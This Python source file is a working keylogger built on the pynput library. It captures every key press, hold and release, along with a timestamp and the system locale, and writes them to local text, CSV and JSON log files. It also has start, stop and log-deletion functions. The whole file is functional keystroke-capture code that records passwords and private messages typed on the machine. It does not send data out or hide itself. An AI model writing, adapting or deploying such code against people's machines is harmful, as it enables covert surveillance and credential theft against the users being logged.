import os , csv
import json , locale , time                                                                 
from pynput import keyboard
from threading import Thread


key_list = []
x = False
listen = None
Time , lang , keys = "","" ,""
 
def create():
    os.makedirs("log", exist_ok=True)

def language():
    lang = locale.getlocale()
    return lang

def timestamp():
    return time.strftime('%Y-%m-%d %H:%M:%S')

def text(key):

    with open(os.path.join("log", "log.txt"), 'a+') as file:
        file.write(f"Timestamp: {Time}, Language: {lang}\n")
        file.write(key)
        file.write("\n\n")

def csv_log(key_list):

    with open(os.path.join("log", "log.csv"), "a+", newline="") as csv_file:
        csv_writer = csv.writer(csv_file)
        for item in key_list:
            csv_writer.writerow([item])

def update_json(key_list):
    with open(os.path.join("log", "logs.json"), 'w') as log:
        json_data = json.dumps(key_list)
        log.write(json_data)

def text_logs():
    text(str(keys))

def press(key):

    global x, key_list, keys
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})

    update_json(key_list)

def release(key):

    global x, key_list, keys
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json(key_list)

    keys = keys + str(key)

def start_log():

    global x, key_list, listen, Time, lang
    create()
    x = False
    key_list = []
    Time = timestamp()
    lang = language()
    key_list.append({'Timestamp': Time, 'Language': lang})
    listen = keyboard.Listener(on_press=press, on_release=release)
    listen.start()
    print("[+] Keylogger started...")
    print("[!] Recording Keylogs")

def stop_log():

    global x, listen
    x = False
    thread = Thread(target=listen.stop)
    thread.daemon = True
    thread.start()

    print("[+] Keylogging stopped.")

def delete():

    try:
        Dir = "log"
        files = os.listdir(Dir)
        for i in files:
            path = os.path.join(Dir, i)
            if os.path.isfile(path):
                os.remove(path)
        print("Log files deleted.")
    except Exception as e:
        print(f"Error occurred while deleting log files: {e}")